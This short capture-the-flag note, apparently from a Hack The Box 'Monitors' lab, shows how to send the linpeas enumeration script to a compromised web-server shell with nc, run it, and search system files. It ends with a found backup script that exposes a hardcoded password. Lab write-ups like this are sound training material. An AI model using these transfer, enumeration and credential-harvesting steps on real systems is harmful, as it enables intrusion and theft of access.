# Transfer Linpeas Using NC

curl and wget are not available on the server, but nc is.

**On the server**

```bash
nc -l -p 9001 > linpeas.sh
```

**On our Machine** 

```bash
nc -w 3 monitors.htb 9001 < linpeas.txt
```

**Back to the Server**

```bash
www-data@monitors:/tmp$ chmod +x linpeas.sh
www-data@monitors:/tmp$ ./linpeas.sh > peas.txt

www-data@monitors:/tmp$ grep 'marcus' /etc -R 2>/dev/null
```

![[Pasted image 20210606195700.png]]


**On /etc/systemd/system/cacti-backup.service**

```bash
$cat cacti-backup.service 

[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
```

```bash
$cat /home/marcus/.backup/backup.sh

#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
``` 